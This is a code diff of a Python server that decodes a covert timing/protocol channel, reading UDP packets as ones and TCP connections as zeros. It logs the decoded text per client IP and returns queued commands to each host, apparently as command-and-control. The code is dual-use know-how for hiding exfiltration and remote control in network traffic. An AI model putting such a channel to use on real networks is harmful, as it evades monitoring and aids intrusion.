@@ -9,58 +9,101 @@ EOF = False
 LOCK = threading.Lock()
 LISTLOCK = threading.Lock()
 LOGLOCK = threading.Lock()
+MESSAGEEVENT = threading.Event()
 HOSTDICT = dict()
 HOSTLOG = dict()
 PORT = 1234
 HOST = "127.0.0.1"
 
 
+#Determines state of client
+def recv_client_list(clientAddr,BinaryDict:dict): #Multi-threaded
+    global LISTLOCK
+    global HOSTDICT
+    global HOSTLOG
+    global LOGLOCK
+    if clientAddr not in HOSTDICT.keys(): #Checks if a client is a known host
+        BinaryDict[clientAddr] = []
+        LISTLOCK.acquire()
+        HOSTDICT[clientAddr] = list() #adds if not
+        LISTLOCK.release()
+        LOGLOCK.acquire()
+        HOSTLOG[clientAddr] = ""
+        LOGLOCK.release()
+
+
 #Thread function
-def handle_UDP(UDPsock:socket,BinaryHolder:list): #TODO update BinaryHolder handler
+def handle_UDP(UDPsock:socket,BinaryDict:dict): #TODO update BinaryHolder handler
     global EOF
-    EOF = False
     global LOCK
-    while not EOF:
+    while True:
         try:
             data, addr = UDPsock.recvfrom(1024)
         except Socket.timeout:
             continue
         LOCK.acquire()
+        recv_client_list(addr[0],BinaryDict)
         if data != b"END" and not EOF:
-            BinaryHolder.append("1")
-            LOCK.release()
-        else: #Message complete. Terminate thread
+            BinaryDict[addr[0]].append("1")
+        else: #Message complete.
             EOF = True
-            LOCK.release()
-            break
+        LOCK.release()
+            
 
 
 #Thread function
-def handle_TCP(TCPsock:socket,BinaryHolder:list,senderIp:list): #TODO update BinaryHolder handler
+def handle_TCP(TCPsock:socket,BinaryDict:dict,senderIp:list): #TODO update BinaryHolder handler
     global EOF
     global LOCK
-    while not EOF: #Main loop
-        try:
-            clientSock, clientAddr = TCPsock.accept()
-        except Socket.timeout:
-            continue
-        recv_client_list(clientAddr[0])
-
-        LOCK.acquire()
-        BinaryHolder.append("0")
-        clientSock.close()
-        LOCK.release()
-
-    #Final return command
     while True:
-        try:
-            clientSock, clientAddr = TCPsock.accept()
-            break
-        except Socket.timeout:
-            continue
-    clientSock.send(send_client_list(clientAddr[0]).encode())
-    clientSock.close()
-    senderIp.append(clientAddr[0])
+        while not EOF: #Main loop
+            try:
+                clientSock, clientAddr = TCPsock.accept()
+            except Socket.timeout:
+                continue
+
+            LOCK.acquire()
+            recv_client_list(clientAddr[0],BinaryDict)
+            BinaryDict[clientAddr[0]].append("0")
+            clientSock.close()
+            LOCK.release()
+
+        #Final return command
+        while True:
+            try:
+                clientSock, clientAddr = TCPsock.accept()
+                break
+            except Socket.timeout:
+                continue
+        clientSock.send(send_client_list(clientAddr[0]).encode())
+        clientSock.close()
+        senderIp.append(clientAddr[0])
+        EOF = False
+        MESSAGEEVENT.set()
+
+
+#Main incoming traffic handler
+def receive_traffic(serverSocketUDP:socket,serverSocketTCP:socket):
+    global HOSTLOG
+    BinaryDict = dict()
+    senderIp = [] #holds the ip of message sender TODO check if obsolete?
+
+    #This is receiving data
+    udp_Thread = threading.Thread(target=handle_UDP,args=(serverSocketUDP,BinaryDict)) #Handles ones
+    tcp_Thread = threading.Thread(target=handle_TCP,args=(serverSocketTCP,BinaryDict,senderIp)) #Handles zeros
+    threads = [udp_Thread,tcp_Thread]
+
+    for thread in threads:
+        thread.start()
+
+    while True:
+        MESSAGEEVENT.wait()
+        messageIp = senderIp.pop(0)
+        output = decode(BinaryDict[messageIp]) #TODO make multi host friendly
+        BinaryDict[messageIp] = []
+        if output != "":
+            HOSTLOG[messageIp] += output
+        MESSAGEEVENT.clear()
 
 
 #Convert the collected binary list into a string
@@ -72,22 +115,6 @@ def decode(BinaryList:list):
     for i in range(0,len(binaryString),8):
         message += chr(int(binaryString[i:i+8],2)) #Binary piece -> ASCII code -> Char
     return message
-
-
-#Determines state of client
-def recv_client_list(clientAddr): #Multi-threaded
-    global LISTLOCK
-    global HOSTDICT
-    global HOSTLOG
-    global LOGLOCK
-    if clientAddr not in HOSTDICT.keys(): #Checks if a client is a known host
-        LISTLOCK.acquire()
-        HOSTDICT[clientAddr] = list() #adds if not
-        LISTLOCK.release()
-        LOGLOCK.acquire()
-        HOSTLOG[clientAddr] = ""
-        LOGLOCK.release()
-
 
 
 #Fetch queued commands and return
@@ -108,27 +135,6 @@ def build_socket(sockType, host:str, port:int) -> socket:
     serverSock.settimeout(0.1)
     serverSock.bind((host,port))
     return serverSock
-
-
-#Main incoming traffic handler
-def receive_traffic(serverSocketUDP:socket,serverSocketTCP:socket):
-    global HOSTLOG
-    BinaryList = [] #holds all incoming binary TODO make into dict with [ip(str),log(str)]
-    senderIp = [] #holds the ip of message sender TODO check if obsolete?
-
-    #This is receiving data
-    udp_Thread = threading.Thread(target=handle_UDP,args=(serverSocketUDP,BinaryList)) #Handles ones
-    tcp_Thread = threading.Thread(target=handle_TCP,args=(serverSocketTCP,BinaryList,senderIp)) #Handles zeros
-    threads = [udp_Thread,tcp_Thread]
-
-    for thread in threads:
-        thread.start()
-    for thread in threads:
-        thread.join()
-
-    output = decode(BinaryList) #TODO make multi host friendly
-    if output != "":
-        HOSTLOG[senderIp[0]] += output
 
 
 def receiver_thread():
